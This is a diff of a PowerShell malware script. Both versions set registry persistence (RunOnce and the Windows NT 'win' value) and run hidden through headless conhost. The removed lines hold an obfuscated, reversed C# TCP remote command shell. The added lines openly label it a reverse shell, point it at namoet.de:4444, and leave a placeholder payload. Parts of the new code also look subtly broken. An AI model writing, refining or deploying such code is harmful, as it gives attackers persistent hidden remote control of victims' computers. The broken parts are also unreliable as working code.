@@ -1,35 +1,17 @@
 powershell -nop -w hidden -c "
-$c = 'conhost.exe --headless powershell -nop -w hidden -c '+[char]34+$MyInvocation.MyCommand+[char]34;
+# Set persistence
+$payload = '$MyInvocation.MyCommand.Definition';
+$regRunOnce = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce';
+$regWindows = 'HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows';
+$command = 'conhost.exe --headless powershell -nop -w hidden -c ' + [char]34 + $payload + [char]34;
 
-# Set RunOnce registry to execute this payload on next login
-Set-ItemProperty 'HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' 'windows' 'conhost.exe --headless powershell -nop -w hidden -c cmd /c (Get-ItemProperty -Path ''HKCU:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'').win';
+Set-ItemProperty -Path $regRunOnce -Name 'windows' -Value 'conhost.exe --headless powershell -nop -w hidden -c cmd /c (Get-ItemProperty -Path ''' + $regWindows + ''').win';
+Set-ItemProperty -Path $regWindows -Name 'win' -Value $command;
 
-# Set the 'win' registry key with this command
-Set-ItemProperty 'HKCU:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows' 'win' $c;
-
-# Original string containing Base64 data with extra prefix/suffix
-$f = 'ask==gClRmL0V2btFmblk=';
-
-# Extract substring which contains the Base64 payload (indexes corrected if needed)
-$d = $f.Substring(3,16).ToCharArray();
-
-# Reverse the character array as per original logic
-[array]::Reverse($d);
-
-# Join reversed chars into string
-$base64string = $d -join '';
-
-# Decode Base64 string using UTF8 encoding (more reliable)
-$y = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64string));
-
-# The rest of the obfuscated payload string (unchanged, trimmed for brevity)
-$g = '}}};)00003(peelS.daerhT}{ hctac } ;)k(b { yrt{ )eurt( elihw{ )k gnirts(am diov citats cilbup}};)d(a};nruter;)(h.c{ )llun == d( fi;)(k.c = d ][etyb{ )eurt( elihw;)4444 ,k(A wen = c{ )k gnirts(b diov citats cilbup}};kaerb ;)(z :051 esac;kaerb ;)c(y :002 esac;kaerb ;)c(x :001 esac;kaerb;)c(v :05 esac{ )]0[b( hctiws;))(y arrAoT.)1(pikS.b(e = c rav{ )b ][etyb(a diov citats cilbup};)(lliK.)(ssecorPtnerruCteG.ssecorP;)(h.c{ )(z diov citats cilbup};)(lliK.])0 ,]0[w(23tnIoT.retrevnoCtiB[d{ )w >][etyb<tsiL(y diov citats cilbup};))]1[w(gnirtSteG.tluafeD.gnidocnE(etirW.tupnIdradnatS.])0 ,]0[w(23tnIoT.retrevnoCtiB[d{ )w >][etyb<tsiL(x diov citats cilbup}};))(gnirtSoT.)2-( ,001 ,x(j{ hctac };z = ]x[d;)(eniLdaeRrorrEnigeB.z;)(eniLdaeRtuptuOnigeB.z;)(tratS.z;)051 ,b ,a(o >= )b ,a( =+ devieceRataDtuptuO.z;)003 ,b ,a(o >= )b ,a( =+ devieceRa taDrorrE.z;t =+ detixE.z;} eurt = stnevEgnisiaRelbanE ,y = ofnItratS { ssecorP wen = z ssecorP{ yrt;}8FTU.gnidocnE = gnidocnErorrEdradnatS,8FTU.gnidocnE = gnidocnEtuptuOdradnatS,eslaf = etucexEllehSesU,eurt = tuptuOdradnatStcerideR,eurt = tupnIdradnatStcerid eR,eurt = rorrEdradnatStcerideR,eslaf = golaiDrorrE,)]0[w(gnirtSteG.tluafeD.gnidocnE = emaNeliF,)]1[w(gnirtSteG.tluafeD.gnidocnE = stnemugrA{ ofnItratSssecorP wen = y ofnItratSssecorP;)0 ,]2[w(23tnIoT.retrevnoCtiB = x tni{ )w >][etyb<tsiL(v diov citats cilbup}};)s(evomeR.d;))(gnirtSoT.edoCtixE.r ,001 ,s(j;yeK.)dI.r == dI.eulaV.t >= t(tluafeDrOtsriF.d = s tni{ )llun =! r( fi;ssecorP sa p = r ssecorP{ )q sgrAtnevE ,p tcejbo(t diov citats cilbup}};)ataD.q ,r ,s(j;yeK.)dI.)ssecorP sa p( == dI.eulaV.t >= t(tluafeDrO tsriF.d = s tni{ ))ataD.q(ytpmErOlluNsI.gnirts! && llun =! p( fi{ )r tni ,q sgrAtnevEdevieceRataD ,p tcejbo(o diov citats cilbup};)n(i.c;)8 - htgneL.n ,8 ,n ,0 ,)m(setyBteG.tluafeD.gnidocnE(ypoC.yarrA;)4 ,4 ,n ,0 ,)l(setyBteG.retrevnoCtiB(ypoC.yarrA;)4 ,0 ,n ,0 ,)k(setyBteG.retrevnoCtiB(ypoC.yarrA;])m(tnuCetyBteG.tluafeD.gnidocnE + 8[etyb wen = n ][etyb{ )m gnirts ,l tni ,k tni(j diov citats cilbup};g nruter};4 + i =+ h;))(yarrAoT.)i(ekaT.)4 + h(pikS.f(ddA.g;)h ,f(23tnIoT.retrevnoCtiB = i tni{ );htgneL.f < h ;0 = h tni( rof;)(>][etyb<tsiL wen = g >][etyb<tsiL{ )f ][etyb(e >][etyb<tsiL citats cilbup;)(>ssecorP ,tni<yranoitciD wen = d >ssecorP ,tni<yranoitciD citats;c A citats{ B ssalc cilbup}};m nruter;)n - htgneL.m ,n ,m(daeR.c =+ n )htgneL.m < n( elihw;0 = n tni;])0 ,l(23tnIoT.retrevnoCtiB[etyb wen = m ][etyb;llun nruter )4 =! )4 ,0 ,l(daeR.c( fi;]4[etyb wen = l ][etyb{ )(k ][etyb cilbup};)(hsulF.c;)htgneL.j ,0 ,j(etirW.c;)4 ,0 ,)htgneL.j(setyBteG.retrevnoCtiB(etirW.c{ )j ][etyb(i diov cilbup};)(esolC.c{ )(h diov cilbup};)htgneL.g ,0 ,g(etirW.c;))(emaNtsoHteG.snD.teN.metsyS(setyBteG.tluafeD.gnidocnE = g ][etyb{ )(f diov etavirp};)(f;)(maertSteG.b = c;)e ,d(tcennoC.b{ )e tni ,d gnirts(A cilbup;c maertSkrowteN cilbup;)(tneilCpcT wen = b tneilCpcT cilbup{ A ssalc cilbup;gnidaerhT.metsyS gnisu;qniL.metsyS gnisu;OI.metsyS gnisu;cireneG.snoitcelloC.metsyS gnisu;stekcoS.teN.metsyS gnisu;scitsongaiD.metsyS gnisu;txeT.metsyS gnisu;metsyS gnisu';
-
-# Convert string $g to char array, reverse and join to get the code
-$l = $g.ToCharArray();
-[array]::Reverse($l);
-Add-Type -TypeDefinition ($l -join '');
-
-# Invoke the main method of the compiled class with the decoded payload
-[B]::ma($y.Trim())
+# Decode and run embedded C# reverse shell
+$b64Payload = '...';  # Put actual Base64-encoded shellcode here
+$bytes = [System.Convert]::FromBase64String($b64Payload);
+$code = [System.Text.Encoding]::UTF8.GetString($bytes);
+Add-Type -TypeDefinition $code;
+[B]::ma('namoet.de:4444');
 "
